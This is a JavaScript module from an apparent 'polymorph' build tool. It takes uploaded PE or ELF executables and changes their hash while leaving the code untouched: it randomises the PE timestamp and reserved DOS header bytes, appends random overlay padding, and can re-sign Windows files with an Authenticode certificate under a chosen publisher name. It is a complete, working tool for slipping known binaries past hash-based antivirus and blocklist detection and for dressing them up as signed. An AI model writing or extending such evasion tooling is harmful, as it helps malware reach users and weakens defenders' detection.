/**
 * Mutate uploaded PE/ELF binaries: new hash without changing executable code.
 * PE: TimeDateStamp + overlay padding (+ optional Authenticode re-sign).
 */
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { signPeFile } = require('./signing');
const {
  randomId,
  readManifest,
  writeManifest,
  BUILDS_DIR,
} = require('./polymorph');

function isPeBuffer(buf) {
  return buf.length >= 0x40 && buf.readUInt16LE(0) === 0x5a4d;
}

function isElfBuffer(buf) {
  return buf.length >= 4 && buf[0] === 0x7f && buf[1] === 0x45 && buf[2] === 0x4c && buf[3] === 0x46;
}

function patchPeTimestamp(buf) {
  try {
    const peOff = buf.readUInt32LE(0x3c);
    if (peOff + 12 > buf.length) return false;
    if (buf.readUInt32LE(peOff) !== 0x00004550) return false;
    const stamp = crypto.randomBytes(4).readUInt32LE(0);
    buf.writeUInt32LE(stamp, peOff + 8);
    return true;
  } catch {
    return false;
  }
}

/** Patch DOS e_res[4] (reserved, unused by loader). */
function patchDosNoise(buf) {
  if (!isPeBuffer(buf) || buf.length < 0x24) return false;
  crypto.randomBytes(8).copy(buf, 0x1c);
  return true;
}

function buildOverlay(stamp) {
  const head = Buffer.from(
    `\r\n;poly:${stamp}\r\n;${crypto.randomBytes(32).toString('hex')}\r\n`,
    'utf8'
  );
  const pad = crypto.randomBytes(256 + (crypto.randomBytes(1)[0] % 3840));
  const tail = crypto.randomBytes(64 + (crypto.randomBytes(1)[0] % 512));
  return Buffer.concat([head, pad, tail]);
}

function safeBaseName(name) {
  const base = path.basename(String(name || 'upload.bin')).replace(/[<>:"/\\|?*\s]/g, '_');
  return base || 'upload.bin';
}

async function mutateUploadedBinary(options = {}) {
  const inputPath = options.inputPath;
  if (!inputPath || !fs.existsSync(inputPath)) {
    throw new Error('input file missing');
  }

  const originalBuf = fs.readFileSync(inputPath);
  if (originalBuf.length < 64) {
    throw new Error('file too small');
  }

  const isPe = isPeBuffer(originalBuf);
  const isElf = !isPe && isElfBuffer(originalBuf);
  if (!isPe && !isElf) {
    throw new Error('Only PE (.exe/.dll) or ELF binaries are supported');
  }

  const id = randomId();
  const stamp = crypto.randomBytes(32).toString('hex');
  const workDir = path.join(BUILDS_DIR, id);
  fs.mkdirSync(workDir, { recursive: true });

  const body = Buffer.from(originalBuf);
  let peTimestampPatched = false;
  let dosNoisePatched = false;
  if (isPe) {
    peTimestampPatched = patchPeTimestamp(body);
    dosNoisePatched = patchDosNoise(body);
  }

  const overlay = buildOverlay(stamp);
  const merged = Buffer.concat([body, overlay]);

  const origName = safeBaseName(options.originalName || path.basename(inputPath));
  let outName = options.outputName ? safeBaseName(options.outputName) : origName;
  if (options.outputName && !/\.(exe|dll|bin|elf)$/i.test(outName)) {
    if (/\.dll$/i.test(origName)) outName += '.dll';
    else if (isElf) outName += '.bin';
    else outName += '.exe';
  }

  const outPath = path.join(workDir, outName);
  fs.writeFileSync(outPath, merged);

  const signOpts = {
    enabled: options.signCode !== false && isPe,
    subject: options.signSubject ? String(options.signSubject).trim() : undefined,
    autoLab: options.signAuto !== false,
  };

  let signResult = { signed: false };
  if (isPe && signOpts.enabled) {
    signResult = await signPeFile(outPath, signOpts);
  }

  const sha256 = crypto.createHash('sha256').update(fs.readFileSync(outPath)).digest('hex');
  const stat = fs.statSync(outPath);
  const sourceSha256 = crypto.createHash('sha256').update(originalBuf).digest('hex');

  const meta = {
    id,
    platform: isPe ? 'windows' : 'linux',
    arch: options.arch || 'amd64',
    variant: 'mutate',
    tool: 'pe-mutate',
    format: isPe ? (outName.toLowerCase().endsWith('.dll') ? 'dll' : 'exe') : 'bin',
    fileName: outName,
    sourceName: origName,
    sourceSha256,
    size: stat.size,
    sha256,
    stamp: stamp.slice(0, 16),
    overlayBytes: overlay.length,
    peTimestampPatched,
    dosNoisePatched,
    authenticodeSigned: !!signResult.signed,
    signPublisher: signResult.publisher,
    signNote: signResult.signed ? undefined : (signResult.reason || undefined),
    createdAt: new Date().toISOString(),
  };

  fs.writeFileSync(path.join(workDir, 'meta.json'), JSON.stringify(meta, null, 2));
  fs.copyFileSync(inputPath, path.join(workDir, `_source_${origName}`));

  const list = readManifest();
  list.unshift(meta);
  writeManifest(list.slice(0, 100));

  return meta;
}

module.exports = {
  mutateUploadedBinary,
  isPeBuffer,
  isElfBuffer,
};
